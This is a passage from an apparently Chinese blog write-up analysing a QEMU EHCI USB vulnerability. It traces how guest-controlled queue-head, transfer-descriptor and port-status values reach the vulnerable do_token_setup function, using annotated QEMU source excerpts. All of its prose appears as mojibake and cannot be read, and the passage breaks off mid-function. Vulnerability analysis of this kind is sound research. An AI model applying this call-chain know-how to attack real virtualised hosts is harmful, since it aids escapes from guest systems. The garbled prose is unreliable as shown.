3)</span><br></code></pre></td></tr></table></figure><p>åœ¨ehci_state_fetchqhå‡½æ•°ä¸­ä¹Ÿä¼šç”¨åˆ°ehci_advance_periodic_stateå‡½æ•°çš„entryå€¼ï¼Œå¹¶ä¸”ä½œä¸ºget_dwordså‚æ•°ï¼Œä¹Ÿå°±æ˜¯entryä¹Ÿå¿…é¡»æ˜¯ä¸ªç‰©ç†åœ°å€ï¼Œå°†é‡Œé¢çš„å€¼ä¿å­˜åˆ°ä¸€ä¸ªEHCIqhç»“æ„ä½“ä¸­ï¼›è®¾ç½®entryè¿™ä¸ªç‰©ç†åœ°å€ä¸­çš„å€¼ä¹Ÿä¸ºEHCIqhç»“æ„ä½“ï¼Œè¿›è€Œå¯ä»¥èµ‹å€¼ç»™q-&gt;qhï¼›è¯¥å‡½æ•°ä¸­è®¾ç½®çš„çŠ¶æ€å€¼æ²¡æœ‰EST_EXECUTEè¿™ä¸ªé€‰é¡¹ï¼Œä½†åœ¨å¦ä¸€ä¸ªehci_state_fetchqtdå‡½æ•°ä¸­å¯ä»¥è®¾ç½®ï¼Œè¿™é‡Œè®¾ç½®æ–°çš„çŠ¶æ€å€¼ä¸ºEST_FETCHQTDï¼›ç„¶åéœ€è¦é€šè¿‡åˆ¤æ–­çš„å€¼ä¸ºq-&gt;qhç»“æ„ä½“ä¸­çš„å˜é‡ï¼Œq-&gt;qhåˆæ˜¯æ¥è‡ªentryè¿™ä¸ªç‰©ç†åœ°å€ä¸­çš„å€¼ï¼Œå¯ä»¥å®Œå…¨æ“çºµï¼Œè®¾ç½®å¥½entryä¸­EHCIqhç»“æ„ä½“çš„å˜é‡å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> EHCIQueue *<span class="hljs-title function_">ehci_state_fetchqh</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br> <span class="hljs-type">uint32_t</span> entry;<br>    EHCIQueue *q;<br>    EHCIqh qh;<br><span class="hljs-comment">//å¾—åˆ°å…ˆå‰ehci_advance_periodic_stateå‡½æ•°ä¸­ä¿å­˜çš„entryå€¼</span><br>    entry = ehci_get_fetch_addr(ehci, async);<br>    <span class="hljs-comment">//å¼€å§‹è¿™é‡Œè°ƒç”¨ehci_find_queue_by_qhè¿”å›NULL</span><br>    q = ehci_find_queue_by_qh(ehci, entry, async);<br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">//ehci_alloc_queueçš„ä½œç”¨ä¸ºï¼šq-&gt;qhaddr = entry</span><br>        q = ehci_alloc_queue(ehci, entry, async);<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-comment">//get_dwordså’Œä¹‹å‰ä¸€æ ·ï¼Œå°†q-&gt;qhaddrçš„ç‰©ç†åœ°å€ä¸­çš„å€¼ä¿å­˜åˆ°qhä¸­</span><br><span class="hljs-keyword">if</span> (get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr), <br>                   (<span class="hljs-type">uint32_t</span> *) &amp;qh, <span class="hljs-keyword">sizeof</span>(EHCIqh) &gt;&gt; <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        q = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>    ehci_trace_qh(q, NLPTR_GET(q-&gt;qhaddr), &amp;qh);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * The overlay area of the qh should never be changed by the guest,</span><br><span class="hljs-comment">     * except when idle, in which case the reset is a nop.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (!ehci_verify_qh(q, &amp;qh)) &#123;<br>        <span class="hljs-keyword">if</span> (ehci_reset_queue(q) &gt; <span class="hljs-number">0</span>) &#123;<br>            ehci_trace_guest_bug(ehci, <span class="hljs-string">&quot;guest updated active QH&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æ›´æ–°qh</span><br>    q-&gt;qh = qh;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> (q-&gt;dev == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">//è·å–q-&gt;devçš„å€¼</span><br>        q-&gt;dev = ehci_find_device(q-&gt;ehci,<br>                                  get_field(q-&gt;qh.epchar, QH_EPCHAR_DEVADDR));<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> (q-&gt;qh.token &amp; QTD_TOKEN_HALT) &#123;<br>        ehci_set_state(ehci, async, EST_HORIZONTALQH);<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE) &amp;&amp;          <br>               (NLPTR_TBIT(q-&gt;qh.current_qtd) == <span class="hljs-number">0</span>) &amp;&amp;<br>               (q-&gt;qh.current_qtd != <span class="hljs-number">0</span>)) &#123;<br>        q-&gt;qtdaddr = q-&gt;qh.current_qtd;<br>        ehci_set_state(ehci, async, EST_FETCHQTD); <span class="hljs-comment">//&lt;----è¿è¡Œè‡³æ­¤</span><br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>ehci_state_fetchqtdå‡½æ•°ä½¿ç”¨q-&gt;qtdaddrè¿™ä¸ªç‰©ç†åœ°å€ï¼Œé€šè¿‡get_dwordsæ¥èµ‹å€¼ç»™qtdï¼Œq-&gt;qtdaddrç”±ä¸Šä¸€æ­¥çš„q-&gt;qh.current_qtdèµ‹å€¼ï¼›å’Œä¹‹å‰ä¸€æ ·çš„å¥—è·¯ï¼Œè®¾ç½®q-&gt;qh.current_qtdè¿™ä¸ªç‰©ç†åœ°å€ä¸­çš„å€¼ä¸ºEHCIqtdç»“æ„ä½“ï¼Œæœ€åçš„qtdä¸­çš„å€¼å˜æˆæˆ‘ä»¬è®¾ç½®çš„ï¼Œè®©qtdé€šè¿‡åˆ¤æ–­ï¼Œè®¾ç½®æ–°çš„çŠ¶æ€å€¼ä¸ºEST_EXECUTEå³å¯ï¼Œä¹‹åå°±å¯ä»¥è¿›å…¥ehci_state_executeå‡½æ•°åå¹¶ä¸€è·¯è¿›å…¥æ¼æ´å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_state_fetchqtd</span><span class="hljs-params">(EHCIQueue *q)</span><br>&#123;<br>    EHCIqtd qtd;<br>    EHCIPacket *p;<br>    <span class="hljs-type">int</span> again = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> addr;<br><br>    addr = NLPTR_GET(q-&gt;qtdaddr);<br>    <span class="hljs-keyword">if</span> (get_dwords(q-&gt;ehci, addr +  <span class="hljs-number">8</span>, &amp;qtd.token,   <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>    <span class="hljs-keyword">if</span> (!(qtd.token &amp; QTD_TOKEN_ACTIVE)) &#123;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>      <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;dev == <span class="hljs-literal">NULL</span>) &#123;<br>        ehci_trace_guest_bug(q-&gt;ehci, <span class="hljs-string">&quot;no device attached to queue&quot;</span>);<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        p = ehci_alloc_packet(q);<br>        p-&gt;qtdaddr = q-&gt;qtdaddr;<br>        p-&gt;qtd = qtd;<br>        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);<span class="hljs-comment">//&lt;----è¿è¡Œè‡³æ­¤</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> again;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯qtdä¸­çš„å€¼å¹¶ä¸èƒ½å®Œå…¨æ»¡è¶³åˆ¤æ–­ï¼Œéœ€è¦<code>q-&gt;dev != NULL</code>è¿™ä¸ªæ¡ä»¶ï¼Œq-&gt;devè¿™ä¸ªå€¼åˆæ˜¯åœ¨å…ˆå‰çš„ehci_state_fetchqhå‡½æ•°ä¸­è°ƒç”¨çš„ehci_find_deviceå†³å®šçš„ï¼ˆå½“æ—¶çœ‹å¾—å¤´éƒ½è¦è£‚å¼€äº†ï¼‰ï¼›ehci_find_deviceå‡½æ•°ä¸­éœ€è¦è®©ehci-&gt;portscçš„å€¼é€šè¿‡åˆ¤æ–­æ‰èƒ½ç»™devèµ‹å€¼ï¼Œehci-&gt;portscçš„å€¼æ˜¯ç”±ehci_port_writeå‡½æ•°è®¾ç½®çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> USBDevice *<span class="hljs-title function_">ehci_find_device</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">uint8_t</span> addr)</span><br>&#123;<br>    USBDevice *dev;<br>    USBPort *port;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NB_PORTS; i++) &#123;<br>        port = &amp;ehci-&gt;ports[i];<br>        <span class="hljs-keyword">if</span> (!(ehci-&gt;portsc[i] &amp; PORTSC_PED)) &#123;<br>            DPRINTF(<span class="hljs-string">&quot;Port %d not enabled\n&quot;</span>, i);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        dev = usb_find_device(port, addr);<br>        <span class="hljs-keyword">if</span> (dev != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> dev;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                          </p><p>ehci_port_writeå‡½æ•°å’Œehci_opreg_wrieå‡½æ•°ä¸€æ ·éƒ½æ˜¯ç›´æ¥å¯ä»¥è¯»å†™PCIè®¾å¤‡æ¥è§¦å‘çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_port_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, hwaddr addr,</span><br><span class="hljs-params">                            <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    EHCIState *s = ptr;<br>    <span class="hljs-type">int</span> port = addr &gt;&gt; <span class="hljs-number">2</span>;<br>    <span class="hljs-type">uint32_t</span> *portsc = &amp;s-&gt;portsc[port];<br>    <span class="hljs-type">uint32_t</span> old = *portsc;<br>    USBDevice *dev = s-&gt;ports[port].dev;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> ((val &amp; PORTSC_PRESET) &amp;&amp; !(*portsc &amp; PORTSC_PRESET)) &#123;<br>        trace_usb_ehci_port_reset(port, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(val &amp; PORTSC_PRESET) &amp;&amp;(*portsc &amp; PORTSC_PRESET)) &#123;<br>        trace_usb_ehci_port_reset(port, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (dev &amp;&amp; dev-&gt;attached) &#123;<br>            usb_port_reset(&amp;s-&gt;ports[port]);<br>            *portsc &amp;= ~PORTSC_CSC;<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         *  Table 2.16 Set the enable bit(and enable bit change) to indicate</span><br><span class="hljs-comment">         *  to SW that this port has a high speed device attached</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (dev &amp;&amp; dev-&gt;attached &amp;&amp; (dev-&gt;speedmask &amp; USB_SPEED_MASK_HIGH)) &#123;<br>            val |= PORTSC_PED;<br>        &#125;<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                         </p><p>åˆå§‹åŒ–PCIè®¾å¤‡çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;<br>    .read = ehci_opreg_read,<br>    .write = ehci_opreg_write,<br>    .valid.min_access_size = <span class="hljs-number">4</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_port_ops = &#123;<br>    .read = ehci_port_read,<br>    .write = ehci_port_write,<br>    .valid.min_access_size = <span class="hljs-number">4</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_pci_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);<br>    EHCIPCIState *i = PCI_EHCI(obj);<br>    EHCIState *s = &amp;i-&gt;ehci;<br><br>    s-&gt;caps[<span class="hljs-number">0x09</span>] = <span class="hljs-number">0x68</span>;        <span class="hljs-comment">/* EECP */</span><br><br>    s-&gt;capsbase = <span class="hljs-number">0x00</span>;<br>    s-&gt;opregbase = <span class="hljs-number">0x20</span>;<br>    s-&gt;portscbase = <span class="hljs-number">0x44</span>;<br>    s-&gt;portnr = NB_PORTS;<br><br>    <span class="hljs-keyword">if</span> (!dc-&gt;hotpluggable) &#123;<br>        s-&gt;companion_enable = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    usb_ehci_init(s, DEVICE(obj));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_init</span><span class="hljs-params">(EHCIState *s, DeviceState *dev)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), <span class="hljs-string">&quot;ehci&quot;</span>, MMIO_SIZE);<br>    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,<br>                          <span class="hljs-string">&quot;capabilities&quot;</span>, CAPA_SIZE);<br>    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,<br>                          <span class="hljs-string">&quot;operational&quot;</span>, s-&gt;portscbase);<br>    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,<br>                          <span class="hljs-string">&quot;ports&quot;</span>, <span class="hljs-number">4</span> * s-&gt;portnr);<br><br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);<br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);<br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,<br>                                &amp;s-&gt;mem_ports);<br>&#125;<br></code></pre></td></tr></table></figure><p>memory_region_add_subregionå‡½æ•°å°†ä¸€ä¸ªå†…å­˜åŒºåŸŸæ·»åŠ ä¸ºå¦ä¸€ä¸ªå¤§çš„å†…å­˜åŒºåŸŸçš„å­åŒºåŸŸï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æ·»åŠ åˆ°å¦ä¸€ä¸ªå¤§çš„å†…å­˜åŒºåŸŸçš„åç§»ï¼Œä¹Ÿå°±æ˜¯å…ˆä½¿ç”¨memory_region_init_ioåˆå§‹åŒ–ä¸‰ä¸ªä¸åŒçš„IOå†…å­˜åŒºåŸŸï¼Œå†ç”±memory_region_add_subregionåˆå¹¶åˆ°å¦ä¸€ä¸ªå¤§çš„å†…å­˜åŒºåŸŸï¼Œè®¿é—®è¿™ä¸ªå¤§çš„å†…å­˜åŒºåŸŸä¸åŒçš„åç§»åœ°å€æ—¶ä¼šè§¦å‘ä¸åŒçš„è¯»å†™åŠŸèƒ½ã€‚</p><p>â€‹                                                  </p><p>è‡³æ­¤è§¦å‘æ¼æ´çš„è°ƒç”¨é“¾æ‰ç®—æ˜¯åˆ†æå®Œæˆäº†ï¼Œå¹¶ä¸”æ˜ç™½äº†è¦è®¾ç½®å“ªäº›å‚æ•°ã€‚</p><h2 id="æ¼æ´å‡½æ•°çš„å‚æ•°è®¾ç½®"><a href="#æ¼æ´å‡½æ•°çš„å‚æ•°è®¾ç½®" class="headerlink" title="æ¼æ´å‡½æ•°çš„å‚æ•°è®¾ç½®"></a>æ¼æ´å‡½æ•°çš„å‚æ•°è®¾ç½®</h2><p>æ˜ç™½æ€æ ·å»è§¦å‘æ¼æ´å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦å¯¹do_token_setupå‡½æ•°ä¸­ç›¸åº”å‚æ•°çš„è®¾ç½®ï¼Œè¿™æ ·æ‰èƒ½å»åˆ©ç”¨æ¼æ´ã€‚</p><p>do_token_setupå‡½æ•°åˆšå¼€å§‹å°±æ˜¯ï¼š <code>if (p-&gt;iov.size != 8)</code> ï¼Œ<code>usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size)</code>ï¼Œè·Ÿp-&gt;iovå…³ç³»æ¯”è¾ƒå¤§ï¼Œs-&gt;setup_bufè¿™ä¸ªä¸»è¦çš„ç»“æ„ä½“æ˜¯é€šè¿‡pä¸­çš„å‚æ•°æ¥èµ‹å€¼çš„ï¼Œåœ¨usb_packet_copyå‡½æ•°ä¸­çš„æ‹·è´æ“ä½œå°±ä½¿ç”¨p-&gt;iov[0].iov_baseä¸­çš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">usb_packet_copy</span><span class="hljs-params">(USBPacket *p, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;<br><br>    assert(p-&gt;actual_length &gt;= <span class="hljs-number">0</span>);<br>    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);<br>    <span class="hljs-keyword">switch</span> (p-&gt;pid) &#123;<br>    <span class="hljs-keyword">case</span> USB_TOKEN_SETUP:<br>    <span class="hljs-keyword">case</span> USB_TOKEN_OUT:<br>        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°p-&gt;iovç»“æ„ä½“ä¸­å˜é‡çš„æ¥æºã€‚</p><p>â€‹                                </p><p>p-&gt;iovç»“æ„ä½“ä¸­å˜é‡æ˜¯ehci_executeå‡½æ•°ä¸­çš„ehci_init_transferå‡½æ•°å’Œusb_packet_mapå‡½æ•°æ“ä½œçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_execute</span><span class="hljs-params">(EHCIPacket *p, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *action)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>    <span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE) &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">//usb_packet_setupæ˜¯ä¸ºp-&gt;pidã€ p-&gt;id ã€p-&gt;epèµ‹å€¼</span><br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ehci_init_transferä¸­çš„p-&gt;qtd æ¥è‡ªä¹‹å‰ehci_state_fetchqtdå‡½æ•°ä¸­çš„<code>p-&gt;qtd = qtd</code>ï¼Œè¿™é‡Œä¸»è¦å°†qtd.tokenå’Œqtd.bufpträ¸­çš„å€¼èµ‹å€¼ç»™sglç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_init_transfer</span><span class="hljs-params">(EHCIPacket *p)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> cpage, offset, bytes, plen;<br>    <span class="hljs-type">dma_addr_t</span> page;<br><br>    cpage  = get_field(p-&gt;qtd.token, QTD_TOKEN_CPAGE);<br>    <span class="hljs-comment">//get_field å®é™…ä¸Šå°±æ˜¯(p-&gt;qtd.token &gt;&gt; QTD_TOKEN_TBYTES)çš„ç»“æœ</span><br>    bytes  = get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES);<br>    offset = p-&gt;qtd.bufptr[<span class="hljs-number">0</span>] &amp; ~QTD_BUFPTR_MASK;<br>    qemu_sglist_init(&amp;p-&gt;sgl, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;device, <span class="hljs-number">5</span>, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;as);<br><br>    <span class="hljs-keyword">while</span> (bytes &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpage &gt; <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;cpage out of range (%d)\n&quot;</span>, cpage);<br>            qemu_sglist_destroy(&amp;p-&gt;sgl);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        page  = p-&gt;qtd.bufptr[cpage] &amp; QTD_BUFPTR_MASK;<br>        page += offset;<br>        plen  = bytes;<br>        <span 